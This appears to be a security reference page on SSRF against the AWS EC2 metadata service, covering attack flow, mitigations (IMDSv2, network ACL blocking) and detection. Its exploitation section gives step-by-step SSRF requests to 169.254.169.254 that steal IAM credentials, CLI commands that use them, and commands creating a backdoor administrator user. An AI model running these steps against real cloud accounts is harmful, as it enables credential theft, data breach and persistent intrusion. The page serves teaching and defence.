☁️ SSRF to AWS Metadata Compromise

CWECWE-918
OWASPA03:2021
CVSS10.0 (Critical)
PlatformAWS EC2

🧠 Description

Server-Side Request Forgery (SSRF) combined with AWS EC2 metadata service allows attackers to extract cloud credentials, escalate privileges, and fully compromise the cloud environment.

Why This is Critical:
  • No Authentication Required: Metadata endpoint is accessible from within the instance
  • IAM Credentials: Temporary credentials for attached IAM roles
  • Privilege Escalation: Role privileges determine access to cloud resources
  • Cross-Account: Sometimes roles can access other accounts
  • Persistent Access: Even after initial foothold is closed

Attack Flow:

  1. Find SSRF vulnerability in web application
  2. Request AWS metadata service at 169.254.169.254
  3. Extract IAM credentials from metadata
  4. Configure AWS CLI with extracted credentials
  5. Enumerate permissions and escalate privileges
  6. Access S3 buckets, Lambda functions, or other services
  7. Exfiltrate data or establish persistent access

📡 AWS Metadata Service

Metadata Endpoints:

# IMDSv1 (old, used in this attack)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# IMDSv2 (newer, requires token)
http://169.254.169.254/latest/api/token

Key Endpoints to Query:

  • /latest/meta-data/iam/security-credentials/ - List credential names
  • /latest/meta-data/iam/security-credentials/[ROLE_NAME] - Get credentials
  • /latest/meta-data/instance-id - EC2 instance ID
  • /latest/meta-data/ami-id - AMI ID
  • /latest/meta-data/instance-type - Instance type
  • /latest/user-data/ - User data (often contains secrets)

💣 Exploitation

Step 1: Basic Metadata Access:

# In vulnerable URL parameter
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Using curl
curl http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

Step 2: Get IAM Role Name:

# Get security credentials path
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Response:
# EC2InstanceRole
# LambdaExecutionRole
# S3FullAccessRole

Step 3: Extract Credentials:

# Get credentials for EC2InstanceRole
http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole

# Response (JSON):
{
  "AccessKeyId": "ASIAXXXXXXXXXX",
  "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxx",
  "Token": "xxxxxxxxxxxxxx...",
  "Expiration": "2024-01-15T12:34:56Z"
}

Step 4: Configure AWS CLI:

# Configure temporary credentials
aws configure set aws_access_key_id ASIAXXXXXXXXXX
aws configure set aws_secret_access_key xxxxxxxxxxxxxxxxxxxx
aws configure set aws_session_token xxxxxxxxxxxxxx...

# Or use environment variables
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=xxxxxxxxxxxxx...

# Verify access
aws sts get-caller-identity

🔓 Cloud Privilege Escalation

Enumerate Permissions:

# Get current identity
aws sts get-caller-identity

# List all attached policies
aws iam list-attached-user-policies --user-name EC2InstanceRole

# Get inline policies
aws iam list-user-policies --user-name EC2InstanceRole

# Check specific services
aws ec2 describe-instances
aws s3 ls
aws lambda list-functions

Privilege Escalation Techniques:

  • Lambda + CloudWatch: Modify Lambda to capture credentials
  • S3 Bucket Access: Read sensitive data from buckets
  • SSM Parameter Store: Access stored secrets
  • PassRole + Lambda: Execute code with additional permissions
  • Create New Users: Add persistent access

Add Backdoor User:

# Create access key for persistence
aws iam create-user --user-name backdoor
aws iam create-access-key --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

💥 Impact Analysis

Potential Damage:
  • Data Breach: Access all S3 buckets, databases, secrets
  • Cryptojacking: Spin up EC2 instances for crypto mining
  • Persistence: Create new users/roles for long-term access
  • Lateral Movement: Access other AWS services
  • Financial Impact: Large AWS bills from resource abuse

Real-World Example:

  • Company's web app has SSRF vulnerability
  • EC2 instance has IAM role with S3FullAccess
  • Attacker extracts credentials and downloads all S3 data
  • Customer PII, financial records, credentials exposed
  • Regulatory fines, reputational damage

🛡️ Mitigation

✅ Application-Level:
  • Input Validation: Whitelist allowed URLs, block internal ranges
  • URL Parsing: Use secure URL parsing libraries
  • Network Segmentation: Block 169.254.169.254 at firewall
  • IMDSv2: Require tokens for metadata access

IMDSv2 Enablement:

# Require IMDSv2 for new instances
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1

# Or in CloudFormation
Resources:
  Ec2Instance:
    Type: AWS::EC2::Instance
    Properties:
      MetadataOptions:
        HttpTokens: required

NACL Rules to Block Metadata:

# Block outbound access to metadata
aws ec2 create-network-acl-entry \
    --network-acl-id acl-xxx \
    --egress true \
    --rule-number 100 \
    --protocol tcp \
    --destination-block 169.254.169.254/32 \
    --port-range From=80,To=80 \
    --rule-action deny

🔍 Detection

CloudWatch Detection Rules:

{
  "ruleName": "SSRF Metadata Access",
  "eventPattern": {
    "source": ["aws.ec2"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventSource": ["ec2.amazonaws.com"],
      "eventName": ["DescribeInstances"],
      "userAgent": ["aws-cli/"]
    }
  },
  "action": {
    "type": "sns"
  },
  "threshold": 10
}

GuardDuty Finding:

  • Unusual instance calling metadata service
  • High volume of DescribeInstances calls
  • Instance accessing services it hasn't accessed before
